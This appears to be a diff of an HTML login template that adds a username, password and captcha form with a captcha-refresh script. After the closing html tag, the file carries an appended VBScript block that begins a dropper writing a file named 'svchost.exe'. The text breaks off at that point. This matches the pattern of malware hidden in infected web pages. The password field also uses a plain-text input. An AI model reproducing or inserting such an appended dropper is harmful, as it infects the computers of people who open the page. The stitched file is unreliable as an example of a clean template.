@@ -2,19 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <title>login</title>
 </head>
 <body>
+<form action="/login" method="post">
+    <p><input type="text" placeholder="username" name="username"></p>
+    <p><input type="text" placeholder="password" name="pwd"></p>
+    <p><input type="text" placeholder="checkcode" name="checkcode"><img src="/checkcode" onclick='ChangeCode();' id='imgCode'></p>
 
+    <input type="submit"><span style="color: red;">{{ status }}</span>
+</form>
+    <script type="text/javascript">
 
-<script>
-    function setCookie(name, value, expires) {
-        var temp = [];
-        var current_date = new Date();
-        current_date.setSeconds(current_date.getSeconds() + 5);
-        document.cookie = name + "= " + value + ";expires=" + current_date.toUTCString();
-    }
-</script>
+        function ChangeCode() {
+            var code = document.getElementById('imgCode');
+            code.src += '?';
+        }
+    </script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
